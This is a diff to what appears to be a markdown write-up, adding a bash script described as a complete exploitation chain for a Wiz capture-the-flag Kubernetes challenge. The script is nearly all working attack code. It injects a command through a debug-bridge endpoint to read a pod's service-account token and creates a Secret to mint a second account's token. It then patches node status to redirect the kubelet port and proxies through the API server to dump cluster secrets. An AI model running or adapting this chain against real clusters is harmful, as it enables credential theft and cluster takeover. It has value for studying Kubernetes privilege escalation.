@@ -389,3 +389,75 @@ curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/service
   https://kubernetes.default.svc/api/v1/namespaces/staging/pods | jq '.items[].spec.containers[].image'
 
 ```
+
+```bash
+#!/bin/bash
+# Complete Wiz CTF Exploitation: exploit.sh + NCC-E003660-JAV
+
+set -e
+
+echo "=========================================="
+echo "Wiz CTF - Complete Exploitation Chain"
+echo "=========================================="
+
+# Phase 1: Initial setup
+export IP_ADDRESS='172.30.0.2'
+export NAMESPACE='app'
+export POD_NAME='app-blog'
+export CONTAINER_NAME='app-blog'
+export KUBE_API="https://172.30.0.2:6443"
+
+echo "[+] Phase 1: Extract app-blog token"
+TOKEN_APP=$(curl -s -XPOST http://k8s-debug-bridge.app/checkpoint \
+  -d "{\"node_ip\": \"${IP_ADDRESS}:10250/run/${NAMESPACE}/${POD_NAME}/${CONTAINER_NAME}?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token#\",
+       \"pod\": \"${POD_NAME}\", \"namespace\": \"${NAMESPACE}\", \"container\": \"${CONTAINER_NAME}\"}")
+
+echo "[+] Phase 2: Create secret for k8s-debug-bridge token"
+cat > /tmp/secret.yml <<'EOF'
+apiVersion: v1
+kind: Secret
+metadata:
+  name: debug-bridge-token
+  namespace: app
+  annotations:
+    kubernetes.io/service-account.name: "k8s-debug-bridge"
+type: kubernetes.io/service-account-token
+EOF
+
+kubectl --server="${KUBE_API}" --insecure-skip-tls-verify=true \
+  --token="${TOKEN_APP}" -n app apply -f /tmp/secret.yml 2>/dev/null || true
+
+sleep 5
+
+echo "[+] Phase 3: Extract k8s-debug-bridge token"
+TOKEN2_B64=$(kubectl --server="${KUBE_API}" --insecure-skip-tls-verify=true \
+  --token="${TOKEN_APP}" -n app get secret debug-bridge-token -o jsonpath='{.data.token}')
+export TOKEN2=$(echo "$TOKEN2_B64" | base64 -d | tr -d '\n\r ')
+
+echo "[+] Phase 4: Get node info"
+NODE=$(kubectl --server="${KUBE_API}" --insecure-skip-tls-verify \
+  --token="$TOKEN2" get nodes -o jsonpath='{.items[0].metadata.name}')
+echo "    Node: $NODE"
+
+echo "[+] Phase 5: NCC-E003660-JAV - Patch node status"
+curl -sk -H "Authorization: Bearer ${TOKEN2}" \
+  -H 'Content-Type: application/json' \
+  "${KUBE_API}/api/v1/nodes/${NODE}/status" > /tmp/node-orig.json
+
+sed 's/"Port": 10250/"Port": 6443/g' /tmp/node-orig.json > /tmp/node-patched.json
+
+curl -sk -H "Authorization: Bearer ${TOKEN2}" \
+  -H 'Content-Type: application/merge-patch+json' \
+  -X PATCH -d "@/tmp/node-patched.json" \
+  "${KUBE_API}/api/v1/nodes/${NODE}/status" > /dev/null
+
+echo "[+] Phase 6: EXPLOIT - Get flag as cluster-admin!"
+echo ""
+
+curl -sk -H "Authorization: Bearer ${TOKEN2}" \
+  "${KUBE_API}/api/v1/nodes/https:${NODE}:6443/proxy/api/v1/secrets/" \
+  | jq -r '.items[] | select(.data.flag) | .data.flag' | base64 -d
+
+echo ""
+echo "[+] DONE! Flag retrieved via NCC-E003660-JAV privilege escalation"
+```
